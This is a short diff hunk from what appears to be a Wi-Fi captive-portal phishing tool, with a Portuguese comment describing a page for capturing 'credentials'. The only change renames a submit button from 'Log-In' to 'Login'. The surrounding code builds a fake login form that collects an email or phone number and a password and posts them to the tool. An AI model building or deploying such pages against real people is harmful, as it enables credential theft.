@@ -73,7 +73,7 @@ String creds() {
 String index() {   // Página com o formulario para captura das "Credenciais".
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post onsubmit=\"return valida_form(this)\">" +
     "<b>Email or Phone:</b> <center><input type=text id=\"email\" autocomplete=email name=email></input></center>" +
-    "<b>Password:</b> <center><input type=password id=\"pass\" name=password></input><input type=submit value=Log-In></form></center>" + footer();
+    "<b>Password:</b> <center><input type=password id=\"pass\" name=password></input><input type=submit value=Login></form></center>" + footer();
 }
 
  String posted() {
